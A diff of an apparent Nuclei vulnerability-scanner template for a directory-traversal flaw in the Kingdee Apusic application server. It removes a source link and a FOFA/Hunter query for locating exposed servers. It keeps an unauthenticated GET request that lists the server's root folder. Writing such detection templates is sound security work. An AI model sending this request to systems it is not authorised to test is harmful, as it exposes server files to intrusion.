@@ -3,14 +3,8 @@ info:
   name: 金蝶Apusic应用服务器(中间件)server_file目录遍历漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0afd672a676d3d0632cdeeecc5c491b5
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0afd672a676d3d0632cdeeecc5c491b5
-    fofa: + hunter`app.name="Apusic 金蝶天燕 Server"&&web.title=="Welcome to Apusic Application Server"`
 http:
 - raw:
   - 'GET /admin/protected/selector/server_file/files?folder=/ HTTP/1.1
